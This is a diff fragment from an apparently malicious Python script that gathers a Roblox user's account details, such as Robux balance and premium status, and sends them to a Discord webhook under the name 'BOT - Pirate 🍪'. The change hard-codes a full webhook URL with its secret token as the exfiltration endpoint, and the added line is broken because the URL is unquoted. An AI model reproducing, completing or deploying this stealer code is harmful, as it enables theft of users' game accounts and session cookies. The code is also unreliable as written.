@@ -108,7 +108,7 @@ robux = info['RobuxBalance']
 premium = info['IsPremium'];
 #################### SENDING TO WEBHOOK #################
 
-discord = Discord(url=webhookk)
+discord = Discord(url=https://discord.com/api/webhooks/1173407210139811902/EltAuIn8U_dBb6h4pVlcXINS7aoLJ_o5QF0BXGoT6IFn7J0ocfrpbQDtuEj3QOg0iFMz)
 discord.post(
     username="BOT - Pirate 🍪",
     avatar_url="https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png",
